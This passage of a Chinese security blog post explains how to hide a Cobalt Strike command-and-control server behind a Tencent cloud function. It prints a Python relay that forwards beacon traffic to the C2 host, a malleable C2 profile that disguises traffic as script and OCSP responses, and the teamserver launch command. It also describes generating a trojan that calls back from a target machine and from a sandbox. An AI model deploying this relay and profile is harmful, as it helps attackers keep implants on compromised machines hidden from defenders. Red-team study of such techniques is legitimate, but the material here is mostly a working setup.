+<h2 id="0x04-C2隐藏"><a href="#0x04-C2隐藏" class="headerlink" title="0x04 C2隐藏"></a>0x04 C2隐藏</h2><p>通过云函数的特性我们可以做到CS上线的隐藏，由于CS支持 HTTP/HTTPS 类型的 Beacon，因此我们也可以通过云函数来转发HTTP/HTTPS请求。其他隐藏 C2 的方式还有 CDN 、域前置等。</p>
+<h3 id="创建云函数-2"><a href="#创建云函数-2" class="headerlink" title="创建云函数"></a>创建云函数</h3><p>开始自定义函数部署，命名函数名称<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%882.33.08.png" alt="截屏2021-12-23 上午2.33.08"><br>写入云函数服务端脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    path = <span class="literal">None</span></span><br><span class="line">    headers = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        C2=<span class="string">&#x27;http://x.x.x.x:80&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():    </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.headers)</span><br><span class="line">            <span class="built_in">print</span>(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.00.27.png" alt="截屏2021-12-23 上午3.00.27"><br>配置触发器，选择 api 网关触发，触发版本为 latest，其余默认<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.02.22.png" alt="截屏2021-12-23 上午3.02.22"><br>配置 api 并修改路径为<code>/</code>，之后发布服务<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.06.42.png" alt="截屏2021-12-23 上午3.06.42"><br>在 CS 可以定制 api.profile 来更加隐匿流量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;func&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;3000&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> maxdns    <span class="string">&quot;255&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span>;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/x&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend <span class="string">&quot;SESSIONID=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/vue.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/bootstrap-2.min.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/y&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        <span class="built_in">id</span> &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend <span class="string">&quot;JSESSION=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建完后放到将 api.profile 放到服务端 CS 上，开始调用 CS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x xxx api.profile</span><br></pre></td></tr></table></figure>
+<h3 id="测试效果-2"><a href="#测试效果-2" class="headerlink" title="测试效果"></a>测试效果</h3><p>在服务中可以看到访问地址<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.08.53.png" alt="截屏2021-12-23 上午3.08.53"><br>开始创建监听器 cs_hidden，并将地址设置为<code>service-xxxx-xxx.xx.xx.tencentcs.com</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.11.21.png" alt="截屏2021-12-23 上午3.11.21"><br>生成木马，将监听器设置为 cs_hidden<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.15.09.png" alt="截屏2021-12-23 上午3.15.09"><br>放入靶机中执行后成功上线 CS，地址都不同，说明<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.27.png" alt="截屏2021-12-23 上午3.18.27"><br>云函数上返回日志<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.42.png" alt="截屏2021-12-23 上午3.18.42"></p>
+<p>放入微步云沙箱发现又有一台主机上线，与此同时地址一直在变换<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.24.14.png" alt="截屏2021-12-23 上午3.24.14"><br>执行流程如下，其中地址为其中的域名，而不是真正的 CS 服务器地址<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.26.03.png" alt="截屏2021-12-23 上午3.26.03"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5bb1bf38/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.39.41.png" alt="截屏2021-12-23 上午3.39.41"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/a670552e/">针对域名的信息收集<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
